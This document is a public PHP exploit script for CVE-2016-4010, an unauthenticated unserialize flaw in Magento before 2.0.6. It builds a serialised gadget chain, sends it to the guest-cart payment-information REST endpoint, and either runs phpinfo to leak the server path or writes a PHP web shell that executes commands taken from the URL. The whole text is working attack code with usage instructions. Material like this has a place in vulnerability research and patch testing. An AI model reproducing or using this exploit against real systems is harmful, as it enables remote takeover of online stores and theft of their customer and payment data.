 
// Exploit Title: [CVE-2016-4010] Magento unauthenticated arbitrary unserialize -> arbitrary write file
// Date: 18/05/206
// Exploit Author: agix (discovered by NETANEL RUBIN)
// Vendor Homepage: https://magento.com
// Version: < 2.0.6
// CVE : CVE-2016-4010
 
// to get a valid guestCartId
// * add an item in your cart
// * go to checkout
// * fill the shipping address stuff and look at the POST request to /rest/default/V1/guest-carts/<guestCartId>/shipping-information
// (* in the response check the payment method it may vary from checkmo)
//
// If you didn\&#039;t provide whereToWrite, it will execute phpinfo to leak path.
 
 
class Magento_Framework_Simplexml_Config_Cache_File extends DataObject
{
    function __construct($data){
        $this->_data = $data;
    }
}
 
class Credis_Client{
    const TYPE_STRING      = &#039;string&#039;;
    const TYPE_LIST        = &#039;list&#039;;
    const TYPE_SET         = &#039;set&#039;;
    const TYPE_ZSET        = &#039;zset&#039;;
    const TYPE_HASH        = &#039;hash&#039;;
    const TYPE_NONE        = &#039;none&#039;;
    const FREAD_BLOCK_SIZE = 8192;
 
    /**
     * Socket connection to the Redis server or Redis library instance
     * @var resource|Redis
     */
    protected $redis;
    protected $redisMulti;
 
    /**
     * Host of the Redis server
     * @var string
     */
    protected $host;
 
    /**
     * Port on which the Redis server is running
     * @var integer
     */
    protected $port;
 
    /**
     * Timeout for connecting to Redis server
     * @var float
     */
    protected $timeout;
 
    /**
     * Timeout for reading response from Redis server
     * @var float
     */
    protected $readTimeout;
 
    /**
     * Unique identifier for persistent connections
     * @var string
     */
    protected $persistent;
 
    /**
     * @var bool
     */
    protected $closeOnDestruct = TRUE;
 
    /**
     * @var bool
     */
    protected $connected = TRUE;
 
    /**
     * @var bool
     */
    protected $standalone;
 
    /**
     * @var int
     */
    protected $maxConnectRetries = 0;
 
    /**
     * @var int
     */
    protected $connectFailures = 0;
 
    /**
     * @var bool
     */
    protected $usePipeline = FALSE;
 
    /**
     * @var array
     */
    protected $commandNames;
 
    /**
     * @var string
     */
    protected $commands;
 
    /**
     * @var bool
     */
    protected $isMulti = FALSE;
 
    /**
     * @var bool
     */
    protected $isWatching = FALSE;
 
    /**
     * @var string
     */
    protected $authPassword;
 
    /**
     * @var int
     */
    protected $selectedDb = 0;
 
    /**
     * @var array
     */
    protected $wrapperMethods = array(&#039;delete&#039; => &#039;del&#039;, &#039;getkeys&#039; => &#039;keys&#039;, &#039;sremove&#039; => &#039;srem&#039;);
 
    /**
     * @var array
     */
    protected $renamedCommands;
 
    /**
     * @var int
     */
    protected $requests = 0;
 
 
    public function __construct($resource) {
        $this->redis = new Magento_Sales_Model_Order_Payment_Transaction($resource);
    }
}
 
class DataObject
{
    /**
     * Object attributes
     *
     * @var array
     */
    protected $_data = [];
 
    /**
     * Setter/Getter underscore transformation cache
     *
     * @var array
     */
    protected static $_underscoreCache = [];
}
 
abstract class AbstractModel2 extends DataObject
{
    /**
     * Prefix of model events names
     *
     * @var string
     */
    protected $_eventPrefix = &#039;core_abstract&#039;;
 
    /**
     * Parameter name in event
     *
     * In observe method you can use $observer->getEvent()->getObject() in this case
     *
     * @var string
     */
    protected $_eventObject = &#039;object&#039;;
 
    /**
     * Name of object id field
     *
     * @var string
     */
    protected $_idFieldName = &#039;id&#039;;
 
    /**
     * Data changes flag (true after setData|unsetData call)
     * @var $_hasDataChange bool
     */
    protected $_hasDataChanges = false;
 
    /**
     * Original data that was loaded
     *
     * @var array
     */
    protected $_origData;
 
    /**
     * Object delete flag
     *
     * @var bool
     */
    protected $_isDeleted = false;
 
    /**
     * Resource model instance
     *
     * @var \Magento\Framework\Model\ResourceModel\Db\AbstractDb
     */
    protected $_resource;
 
    /**
     * Resource collection
     *
     * @var \Magento\Framework\Model\ResourceModel\Db\Collection\AbstractCollection
     */
    protected $_resourceCollection;
 
    /**
     * Name of the resource model
     *
     * @var string
     */
    protected $_resourceName;
 
    /**
     * Name of the resource collection model
     *
     * @var string
     */
    protected $_collectionName;
 
    /**
     * Model cache tag for clear cache in after save and after delete
     *
     * When you use true - all cache will be clean
     *
     * @var string|array|bool
     */
    protected $_cacheTag = false;
 
    /**
     * Flag which can stop data saving after before save
     * Can be used for next sequence: we check data in _beforeSave, if data are
     * not valid - we can set this flag to false value and save process will be stopped
     *
     * @var bool
     */
    protected $_dataSaveAllowed = true;
 
    /**
     * Flag which allow detect object state: is it new object (without id) or existing one (with id)
     *
     * @var bool
     */
    protected $_isObjectNew = null;
 
    /**
     * Validator for checking the model state before saving it
     *
     * @var \Zend_Validate_Interface|bool|null
     */
    protected $_validatorBeforeSave = null;
 
    /**
     * Application Event Dispatcher
     *
     * @var \Magento\Framework\Event\ManagerInterface
     */
    protected $_eventManager;
 
    /**
     * Application Cache Manager
     *
     * @var \Magento\Framework\App\CacheInterface
     */
    protected $_cacheManager;
 
    /**
     * @var \Magento\Framework\Registry
     */
    protected $_registry;
 
    /**
     * @var \Psr\Log\LoggerInterface
     */
    protected $_logger;
 
    /**
     * @var \Magento\Framework\App\State
     */
    protected $_appState;
 
    /**
     * @var \Magento\Framework\Model\ActionValidator\RemoveAction
     */
    protected $_actionValidator;
 
    /**
     * Array to store object&#039;s original data
     *
     * @var array
     */
    protected $storedData = [];
}
 
abstract class AbstractExtensibleModel extends AbstractModel2
{
    protected $extensionAttributesFactory;
 
    /**
     * @var \Magento\Framework\Api\ExtensionAttributesInterface
     */
    protected $extensionAttributes;
 
    /**
     * @var AttributeValueFactory
     */
    protected $customAttributeFactory;
 
    /**
     * @var string[]
     */
    protected $customAttributesCodes = null;
 
    /**
     * @var bool
     */
    protected $customAttributesChanged = false;
 
}
 
abstract class AbstractModel extends AbstractExtensibleModel
{
}
 
class Magento_Sales_Model_Order_Payment_Transaction extends AbstractModel
{
    /**#@+
     * Supported transaction types
     * @var string
     */
    const TYPE_PAYMENT = &#039;payment&#039;;
 
    const TYPE_ORDER = &#039;order&#039;;
 
    const TYPE_AUTH = &#039;authorization&#039;;
 
    const TYPE_CAPTURE = &#039;capture&#039;;
 
    const TYPE_VOID = &#039;void&#039;;
 
    const TYPE_REFUND = &#039;refund&#039;;
 
    /**#@-*/
 
    /**
     * Raw details key in additional info
     */
    const RAW_DETAILS = &#039;raw_details_info&#039;;
 
    /**
     * Order instance
     *
     * @var \Magento\Sales\Model\Order\Payment
     */
    protected $_order = null;
 
    /**
     * Parent transaction instance
     * @var \Magento\Sales\Model\Order\Payment\Transaction
     */
    protected $_parentTransaction = null;
 
    /**
     * Child transactions, assoc array of transaction_id => instance
     *
     * @var array
     */
    protected $_children = null;
 
    /**
     * Child transactions, assoc array of txn_id => instance
     * Filled only in case when all child transactions have txn_id
     * Used for quicker search of child transactions using isset() as opposite to foreaching $_children
     *
     * @var array
     */
    protected $_identifiedChildren = null;
 
    /**
     * Whether to perform automatic actions on transactions, such as auto-closing and putting as a parent
     *
     * @var bool
     */
    protected $_transactionsAutoLinking = true;
 
    /**
     * Whether to throw exceptions on different operations
     *
     * @var bool
     */
    protected $_isFailsafe = true;
 
    /**
     * Whether transaction has children
     *
     * @var bool
     */
    protected $_hasChild = null;
 
    /**
     *
     * @var string
     * @see \Magento\Framework\Model\AbstractModel::$_eventPrefix
     */
    protected $_eventPrefix = &#039;sales_order_payment_transaction&#039;;
 
    /**
     *
     * @var string
     * @see \Magento\Framework\Model\AbstractModel::$_eventObject
     */
    protected $_eventObject = &#039;order_payment_transaction&#039;;
 
    /**
     * Order website id
     *
     * @var int
     */
    protected $_orderWebsiteId = null;
 
    /**
     * @var \Magento\Sales\Model\OrderFactory
     */
    protected $_orderFactory;
 
    /**
     * @var \Magento\Framework\Stdlib\DateTime\DateTimeFactory
     */
    protected $_dateFactory;
 
    /**
     * @var TransactionFactory
     */
    protected $_transactionFactory;
 
    /**
     * @var \Magento\Sales\Api\OrderPaymentRepositoryInterface
     */
    protected $orderPaymentRepository;
 
    /**
     * @var \Magento\Sales\Api\OrderRepositoryInterface
     */
    protected $orderRepository;
 
    /**
     * @param \Magento\Framework\Model\Context $context
     * @param \Magento\Framework\Registry $registry
     * @param \Magento\Framework\Api\ExtensionAttributesFactory $extensionFactory
     * @param AttributeValueFactory $customAttributeFactory
     * @param \Magento\Sales\Model\OrderFactory $orderFactory
     * @param \Magento\Framework\Stdlib\DateTime\DateTimeFactory $dateFactory
     * @param TransactionFactory $transactionFactory
     * @param \Magento\Framework\Model\ResourceModel\AbstractResource $resource
     * @param \Magento\Framework\Data\Collection\AbstractDb $resourceCollection
     * @param array $data
     */
    public function __construct($resource) {
        $this->_resource = $resource;
    }
}
 
class Magento_Framework_DB_Transaction{
    protected $_objects = [];
 
    /**
     * Transaction objects array with alias key
     *
     * @var array
     */
    protected $_objectsByAlias = [];
 
    /**
     * Callbacks array.
     *
     * @var array
     */
    protected $_beforeCommitCallbacks = ["phpinfo"];
}
 
if(count($argv) < 3){
    echo &#039;Usage: &#039;.$argv[0].&#039; <magento_uri> <guestCartId> (whereToWrite)&#039;.chr(0x0a);
    echo &#039;To get a valid guestCartId&#039;.chr(0x0a);
    echo &#039;* add an item in your cart&#039;.chr(0x0a);
    echo &#039;* go to checkout&#039;.chr(0x0a);
    echo &#039;* fill the shipping address stuff and look at the POST request to /rest/default/V1/guest-carts/<guestCartId>/shipping-information&#039;.chr(0x0a);
    echo &#039;(* in the response check the payment method it may vary from "checkmo")&#039;.chr(0x0a).chr(0x0a);
    echo &#039;If you didn\&#039;t provide whereToWrite, it will execute phpinfo to leak path.&#039;.chr(0x0a);
    exit();
}
 
if(count($argv) === 4){
    $data = [];
    $data[&#039;is_allowed_to_save&#039;] = True;
    $data[&#039;stat_file_name&#039;] = $argv[3];
    $data[&#039;components&#039;] = &#039;<?php system($_GET[0]); ?>&#039;;
    $resource = new Magento_Framework_Simplexml_Config_Cache_File($data);
}
else{
    $resource = new Magento_Framework_DB_Transaction();
}
 
$redis = new Credis_Client($resource);
$serialized = serialize($redis);
 
$payload = json_decode(&#039;{"paymentMethod":{"method":"checkmo", "additional_data":{"additional_information":""}}, "email": "valid@magento.com"}&#039;);
 
$payload->paymentMethod->additional_data->additional_information = str_replace(&#039;Magento_Framework_DB_Transaction&#039;, &#039;Magento\\Framework\\DB\\Transaction&#039;, str_replace(&#039;Magento_Sales_Model_Order_Payment_Transaction&#039;, &#039;Magento\\Sales\\Model\\Order\\Payment\\Transaction&#039;, str_replace(&#039;Magento_Framework_Simplexml_Config_Cache_File&#039;, &#039;Magento\\Framework\\Simplexml\\Config\\Cache\\File&#039;, $serialized)));
 
for($i=0; $i<2; $i++){
    $c = curl_init($argv[1].&#039;/rest/V1/guest-carts/&#039;.$argv[2].&#039;/set-payment-information&#039;);
    curl_setopt($c, CURLOPT_HTTPHEADER, array(&#039;Content-Type: application/json&#039;));
    curl_setopt($c, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_exec($c);
    curl_close($c);
}
 
?>

